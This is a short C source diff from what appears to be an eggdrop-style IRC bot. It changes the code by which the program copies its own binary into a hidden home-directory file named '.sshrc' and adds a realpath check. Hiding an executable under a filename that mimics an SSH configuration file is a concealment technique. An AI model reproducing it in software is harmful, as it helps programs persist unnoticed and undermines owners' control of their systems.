@@ -584,35 +584,35 @@ int main(int argc, char **argv)
 #ifdef LEAF
   /* move the binary to the correct place */
   {
-    char newbin[DIRMAX] = "";
+    char newbin[DIRMAX] = "", real[DIRMAX] = "";
 
     sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
     chdir(homedir());
     egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
 
     sdprintf(STR("newbin at: %s"), newbin);
-
+    
+    realpath(binname, real);		/* get the realpath of binname */
     /* running from wrong dir, or wrong bin name.. lets try to fix that :) */
-    if (strcmp(binname,newbin)) { 
+    if (strcmp(binname, newbin) && strcmp(newbin, real)) { 		/* if wrong path and new path != current */
 #ifdef LEAF
       int ok = 1;
 #endif /* LEAF */
 
       sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
       unlink(newbin);
-      if (copyfile(binname,newbin))
+      if (copyfile(binname, newbin))
         ok = 0;
 
-      if (ok) 
-       if (!can_stat(newbin)) {
+      if (ok && !can_stat(newbin)) {
          unlink(newbin);
          ok = 0;
-       }
-      if (ok) 
-        if (!fixmod(newbin)) {
+      }
+
+      if (ok && !fixmod(newbin)) {
           unlink(newbin);
           ok = 0;
-        }
+      }
 
       if (!ok)
         werr(ERR_WRONGBINDIR);
